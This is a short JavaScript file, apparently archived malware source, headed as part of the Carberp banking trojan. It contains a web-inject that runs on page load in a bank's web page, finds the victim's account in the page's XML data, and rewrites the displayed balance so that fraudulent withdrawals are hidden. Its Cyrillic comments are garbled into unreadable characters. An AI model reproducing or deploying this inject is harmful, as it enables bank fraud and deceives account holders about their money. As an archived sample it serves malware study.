/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
/*������� �� ������, ��������� �� ����� -> ������� -> �������� ������ �������� �� ������*/
var new_balance;

$(document).ready(function(){
	/*�������� ��� �������� ���������*/
	changeBalance();
});

/*���������� ��� ���������� XML*/
function fix()
{
	changeBalance();
}
/*������ XML, �������� ������ �� ������ �����*/
function changeBalance()
{
	if(!document.getElementById("ScData"))
		return;

	var xml = document.getElementById("ScData").XMLDocument;

	$(xml.documentElement.childNodes).each(function(){
		var $this = $(this);
		/*���� ��� ������ ����*/
		if($this.attr("B") == acc_id)
		{
			if(!new_balance)
				new_balance = moneyToFloat($this.attr("C"))+balance;
				
			/*������ ������*/
			$this.attr("C", roundMoney(new_balance).toString());
		}
	});

}